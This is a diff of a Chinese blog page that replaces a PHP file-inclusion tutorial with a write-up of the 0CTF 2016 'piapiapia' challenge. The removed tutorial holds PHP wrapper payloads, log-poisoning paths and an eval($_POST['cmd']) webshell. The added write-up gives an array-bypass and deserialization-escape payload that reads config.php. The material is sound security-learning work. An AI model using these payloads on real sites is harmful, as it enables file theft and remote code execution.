@@ -117,128 +117,82 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2021/03/21/The-learning-of-php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">The learning of php 文件包含</a>
+      <h1 class="post-title"><a class="post-link" href="/2021/03/23/Noting-of-0CTF-2016-piapiapia/">Noting of [0CTF 2016]piapiapia</a>
         </h1>
 
       <div class="post-meta">
         <span class="post-time">
-          2021-03-21
+          2021-03-23
         </span><span class="post-category">
             <a href="/categories/WebSummary/">WebSummary</a>
             </span>
         </div>
     </header>
 
-    <div class="post-content"><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>文件包含顾名思义, 通过某些函数来引入一些文件但传入的文件名没有经过合理的验证, 从而操作了预想之外的文件, 就可能导致意外的文件泄漏甚至恶意代码注入。</p>
-<h2 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h2><ol>
-<li><p><code>include()</code></p>
-</li>
-<li><p><code>require()</code></p>
-</li>
-<li><p><code>include_once()</code></p>
-</li>
-<li><p><code>require_once()</code></p>
-</li>
-<li><p><code>highlight_file()</code></p>
-</li>
-<li><p><code>show_source()</code></p>
-</li>
-<li><p><code>readfile()</code></p>
-</li>
-<li><p><code>file_get_contents()</code></p>
-</li>
-<li><p><code>fopen()</code></p>
-</li>
-<li><p><code>file()</code></p>
-</li>
-</ol>
-<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>通常情况下有文件包含函数还不够, 需要搭配伪协议才能干更多的事情</p>
-<table>
-<thead>
-<tr>
-<th align="center">协议</th>
-<th align="center">PHP版本</th>
-<th align="center">alow_url_fopen</th>
-<th align="center">allow_url_include</th>
-<th align="left">用法示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">file://</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center">off/on</td>
-<td align="left">file://D:/soft/phpStudy/WWW/flag.txt</td>
-</tr>
-<tr>
-<td align="center">php://filter</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center">off/on</td>
-<td align="left">php://filter/read=convert.base64-encode/resource=./index.php</td>
-</tr>
-<tr>
-<td align="center">php://input</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center"><strong>on</strong></td>
-<td align="left">php://input  [post data]: <code>&lt;?php phpinfo() ?&gt;</code></td>
-</tr>
-<tr>
-<td align="center">zip://</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center">off/on</td>
-<td align="left">zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt</td>
-</tr>
-<tr>
-<td align="center">compress.bzip2://</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center">off/on</td>
-<td align="left">compress.bzip2://D:/soft/phpStudy/WWW/file.bz2<br />compress.bzip2://./file.bz2</td>
-</tr>
-<tr>
-<td align="center">compress.zlib://</td>
-<td align="center">&gt;=5.2</td>
-<td align="center">off/on</td>
-<td align="center">off/on</td>
-<td align="left">同上</td>
-</tr>
-<tr>
-<td align="center">data://</td>
-<td align="center">&gt;=5.2</td>
-<td align="center"><strong>on</strong></td>
-<td align="center"><strong>on</strong></td>
-<td align="left">data://text/plain,<code>&lt;?php phpinfo()?&gt;</code><br />data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td>
-</tr>
-</tbody></table>
-<h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>Web服务器一般会将用户的访问记录保存在日志文件当中. 如果存在文件包含的函数, 而且知道日志文件的路径, 可以构造请求把PHP代码写进日志文件中并引入执行</p>
-<h3 id="寻找日志文件"><a href="#寻找日志文件" class="headerlink" title="寻找日志文件"></a>寻找日志文件</h3><p>日志文件的目录一般会被修改, 可以寻找<code>httpd.conf,nginx,conf</code>或者根据<code>phpinfo()</code>中的信息来得知日志文件目录</p>
-<p>Apache:</p>
-<ol>
-<li><p>Windows: <code>&lt;Apache安装目录&gt;\logs\access.log | error.log</code></p>
-</li>
-<li><p>Linux: <code>/usr/local/apache/logs/access_log | error_log </code></p>
-</li>
-</ol>
-<p>Nginx:</p>
-<ol>
-<li><code>/var/log/nginx</code></li>
-</ol>
-<h2 id="包含session-upload-progress"><a href="#包含session-upload-progress" class="headerlink" title="包含session.upload_progress"></a>包含<code>session.upload_progress</code></h2><blockquote>
-<p>PHP版本: 5.4+</p>
+    <div class="post-content"><blockquote>
+<p>这题算是第一次做比较长的web题, 收获很多, 好好记录一下</p>
 </blockquote>
-<p>在php5.4以上添加了一个新的功能 <code>session.upload_progress</code>, 这个功能在客户端上传文件的时候会创建一个<code>session</code>文件, 默认路径应该是<code>/tmp/tmp</code>, 这个文件里存储的上传文件的进度. </p>
-<p>不过, 要利用这个<code>session.upload_progress</code>, 还要依靠另外一个<code>php.ini</code>的默认选项<code>session.use_strict_mode = 0</code>, 当这个值为0的时候, 用户是可以自己定义<code>Session ID</code>的, 比如在<code>Cookies</code>中设置<code>PHPSESSID = k1rit0</code>, <code>php</code>将在服务器上创建一个<code>tmp/tmp/sess_k1rit0</code>, 并且自动初始化, 也就是会在里面写入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.prefix + session.upload_progress.name</span><br></pre></td></tr></table></figure>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这道题主要的考察点有:</p>
+<ol>
+<li>源码泄露</li>
+<li>数组绕过正则匹配和<code>strlen()</code></li>
+<li>反序列化字符逃逸</li>
+</ol>
+<h1 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h1><p>就一个登录页面, 随便输入尝试弱密码登录无果.<br>测试是否存在sql, 也没什么收获<br>随手一试<code>www.zip</code>, 可以下载 存在源码泄露</p>
+<p>源码主要有这几个文件:</p>
+<ul>
+<li>update.php</li>
+<li>register.php</li>
+<li>profile.php</li>
+<li>index.php</li>
+<li>config.php</li>
+<li>class.php</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>做ctf肯定要找flag, <code>config.php</code>中就有<code>$flag</code>, 所以要想办法读取<code>config.php</code>.<br>大概浏览了一下, 在<code>profile.php</code>中发现了这么一行<br> <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></p>
+<p>再往上找找看这个函数中的参数是否可控, 下面是往上找的过程:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.php</span></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>); </span><br><span class="line"><span class="comment">// 可能存在反序列化漏洞, 也可以知道这里的$profile是个序列化串, 继续往前</span></span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>); <span class="comment">// $profile 是调用$user-&gt;show_profile()得到的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profile是从数据库读出来的, 并且没有处理, 所以数据库中就是序列化字符串</span></span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>); </span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profile上传时会经过一次过滤</span></span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>); <span class="comment">// 这个过滤器会替换字符, 可以使得字符长度变长</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>session.upload_progress.prefix</code>是服务端设置的, 默认为<code>upload_progress_</code><br><code>session.upload_progress.name</code>是用户<code>POST</code>的<code>data</code>: <code>PHP_SESSION_UPLOAD_PROGRESS</code>, 比如<code>POST</code> <code>PHP_SESSION_UPLOAD_PROGRESS= &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code><br>那么用户在上传文件的时候, 就会生成这么一个<code>session</code>文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span> | <span class="comment">// 后面是上传进度</span></span><br></pre></td></tr></table></figure>
+<p>看到这里大概就有思路了, <code>$profile</code>是上传至数据库后重新读取下来的, 而且上传之前会对序列化串进行一次替换, 替换存在字符数量增加, 也就意味着可以字符逃逸,  如果有字符逃逸, 那么完全可以伪造一个假的<code>$profile[&#39;photo&#39;]=&#39;config.php&#39;</code>, 然后读取flag</p>
+<p>再继续往前看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// register.php 提供了注册的入口, 注册完就能随便登录了, 登录后就能上传profile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure>
 
+<p>可以看到我们可以控制的有很多参数<code>phone, email, nickname</code>都可以, 但是如果要进行字符逃逸, 必然会被前面的正则发现导致上传失败, 所以要想办法绕过</p>
+<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>php中的数组是一个很神奇的东西, 他会有下面这些特性</p>
+<ol>
+<li><code>md5(Array()) = null</code></li>
+<li><code>sha1(Array()) = null</code></li>
+<li><code>ereg(pattern,Array()) =null</code></li>
+<li><code>preg_match(pattern,Array()) = false</code></li>
+<li><code>strcmp(Array(), “abc”) =null</code></li>
+<li><code>strpos(Array(),“abc”) = null </code></li>
+<li><code>strlen(Array()) = null</code> 5.3以下版本无报错, 5.3及以上版本会出现E_NOTICE级别错误, 下面有关于错误等级的一些知识</li>
+</ol>
+<p> 我们可以看到, 如果参数是数组, 那么<code>preg_match()</code>和<code>strlen()</code>都会返回NULL,并且出现E_NOTICE错误, 这个错误是不影响程序继续运行的. </p>
+<p>所以, 我们只要传参<code>nickname[]=xxxxxx</code>, 就可以绕过这个正则, 任意控制参数<code>$_POST[&#39;nickname&#39;]</code>了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
+<h3 id="PHP-错误等级"><a href="#PHP-错误等级" class="headerlink" title="PHP 错误等级"></a>PHP 错误等级</h3><p>E_NOTICE 表示一般情形不记录，只有程式有错误情形时才用到，例如企图存取一个不存在的变数，或是呼叫 stat() 函式检视不存在的档案。<br>E_WARNING 通常都会显示出来，但不会中断程式的执行。这对除错很有效。例如：用有问题的常规表示法呼叫 ereg()。<br>E_ERROR 通常会显示出来，亦会中断程式执行。意即用这个遮罩无法追查到记忆体配置或其它的错误。<br>E_PARSE 从语法中剖析错误。<br>E_CORE_ERROR 类似 E_ERROR，但不包括 PHP核心造成的错误。<br>E_CORE_WARNING 类似 E_WARNING，但不包括 PHP 核心错误警告。</p>
+<p>所以整个流程就是</p>
+<p>通过绕过正则任意上传<code>nickename</code> -&gt; 替换<code>serialize_string</code>中的字符改变字符长度造成字符逃逸 -&gt; 利用<code>file_get_contents()</code>读取<code>config.php</code></p>
+<h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>那么要怎么构造<code>nickname[]</code>来进行字符逃逸呢,</p>
+<p>先来看看这个序列化字符串大概是怎样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:0:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p>很显然这个文件如果被文件包含函数包含, 则可以执行一系列的命令<br><strong>但是这个<code>session</code>文件将在文件上传完成之后自动删除.<strong>这里就需要利用</strong>条件竞争</strong>了, 不停的上传同样的文件, 使得<code>session</code>一直存在.</p>
+<p>如果我们想最后反序列化出来的<code>photo =&gt; config.php</code>,<br>那么传上去的<code>nickname</code>最后一段应该是这个<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>,  这段字符一共34个, 再看一下替换的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 过滤&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27; 替换成hacker</span></span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到, 序列化后的字符串<code>serialize_string</code>中存在<code>where</code>时会被替换成<code>hacker</code>, 那么字符串长度就会+1<br>所以<code>nickname</code>中需要34个<code>where</code>就能把后面的字符挤出去实现逃逸, 可以看一下具体效果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment">#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>等到反序列化的时候, 就只会反序列化前面一部分了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果就会是:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="string">&quot;phone&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;11111111111&quot;</span> </span><br><span class="line">		[<span class="string">&quot;email&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;11111111@qq.com&quot;</span> </span><br><span class="line">		[<span class="string">&quot;nickname&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">204</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span> &#125; </span><br><span class="line">		[<span class="string">&quot;photo&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span> </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>成功了!</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>先随便注册一个用户并登录，在<code>profile</code>上传的时候先随便填写数据，再抓包，将<code>nickname</code>改成<br><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p>
+<p>上传完后访问<code>profile.php</code>, 查看图片的地址，最后把<code>base64</code>转成文本就有flag了</p>
 
         </div></article>
       <nav class="pagination"><a class="prev" href="/page/13/">
